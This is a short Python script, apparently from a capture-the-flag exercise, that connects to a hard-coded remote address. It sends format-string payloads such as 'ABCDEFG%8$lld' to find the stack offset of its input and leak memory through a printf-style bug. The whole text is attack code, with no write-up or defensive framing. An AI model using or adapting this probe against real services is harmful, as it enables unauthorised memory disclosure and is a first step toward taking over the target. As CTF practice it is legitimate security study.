#!/usr/bin/env python3
import socket, time, re
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.05)
    try: return s.recv(4096)
    except Exception: return b'<T>'
# send "XXXXXXXABCDEFG%8$lld" -> buffer[16:22]="ABCDEFG" then %8$lld
s=newconn()
for pat in [b"ABCDEFG", b"1234567"]:
    fmt = pat + b"%8$lld"
    d=ask(s,fmt)
    print(repr(pat), "=>", repr(d))
    time.sleep(0.1)
s.close()
